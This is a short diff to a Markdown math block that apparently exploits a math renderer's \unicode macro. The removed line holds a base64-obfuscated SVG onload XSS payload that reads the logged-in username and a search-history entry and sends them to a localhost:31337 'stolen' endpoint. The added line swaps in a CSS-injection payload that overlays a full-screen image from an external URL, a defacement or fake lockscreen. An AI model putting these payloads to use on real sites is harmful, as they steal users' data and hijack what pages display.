@@ -1,5 +1,3 @@
-
 ```math
-\ce{$&#x5C;unicode[<svg onload=eval(atob(/c2V0VGltZW91dCgoKSA9PiB7dmFyIHVzZXJuYW1lID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvZ2dlZC1pbi11c2VyJyk7IHZhciB1c2VyVGV4dCA9IHVzZXJuYW1lLnRleHRDb250ZW50OyB2YXIgZGF0YVRleHQgPSAoZG9jdW1lbnQuZ2V0RWxlbWVudHNCeUNsYXNzTmFtZSgnaGlzdG9yeS-1pdGVtIGxpc3QtZ3JvdXAtaXRlbScpWzFdKS50ZXh0Q29udGVudDsgJC5nZXQoJ2h0dHA6Ly9sb2NhbGhvc3Q6MzEzMzcvc3RvbGVuP3VzZXI9Jyt1c2VyVGV4dCsnJmxhc3Rfc2VhcmNoPScrZGF0YVRleHQpO30sMzAwMCk7/.source)));]{x0001}$}```
-
+\ce{$&#x5C;unicode[goombafont; color:red; pointer-events: none; z-index: -10; position: fixed; top: 0; left: 0; height: 100vh; object-fit: cover; background-size: cover; width: 130vw; opacity: 0.5; background: url(/https://github.com/unkn0wncode/unkn0wncode/blob/main/lockscreen.png?raw=true/);]{x0000}$}
 
